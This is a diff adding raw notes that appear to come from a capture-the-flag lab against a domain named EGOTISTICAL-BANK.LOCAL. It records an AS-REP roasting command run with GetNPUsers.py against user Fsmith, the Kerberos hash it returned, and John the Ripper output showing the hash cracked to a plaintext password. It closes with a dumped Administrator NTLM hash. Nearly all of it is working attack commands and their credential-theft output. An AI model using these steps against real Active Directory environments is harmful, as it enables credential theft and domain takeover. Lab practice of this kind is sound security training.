@@ -1,0 +1,12 @@
+python GetNPUsers.py EGOTISTICAL-BANK.LOCAL./Fsmith -dc-ip 10.10.10.175 -no-pass -format john
+$krb5asrep$Fsmith@EGOTISTICAL-BANK.LOCAL.:ba61012c026ab6ec6b5113a922d563ab$a415a69194ea1b19aaed2c425a84db1aea8da3a843fde7fb3a7d7f47a0f3a9e564e0517bcb115aa46e4a30ad01be0615ae87e3d7f0d06185acd1f160f517cf53299164f46192665ffce2237e1937503824cec3ce2e8b91144fab4532bfab23ad14035abd4eefdb4c204d2a4b55172010fed9db5d5937a0032f2bb49eaa79742c9c14936400f2d7281bf93b6c9429ad13bc2c5354141d00cef8240facde8c144a0697906ffe57a3ae0de3b3a709ec6aef5077e9e6cd26b7a30d78a3489d831a02d8de64e25c9fb14dbf8f6ff6c4f111e5ae6fa22ead8b3c5beb611dd1088fd5f85338e2cb14a4c3ac4b05b809d8ad381d10ca03b0bc2b08aa5a8d4b9ccb23a62636
+
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+
+Thestrokes23     ($krb5asrep$Fsmith@EGOTISTICAL-BANK.LOCAL.)
+
+$krb5asrep$Fsmith@EGOTISTICAL-BANK.LOCAL.:Thestrokes23
+
+1 password hash cracked, 1 left
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
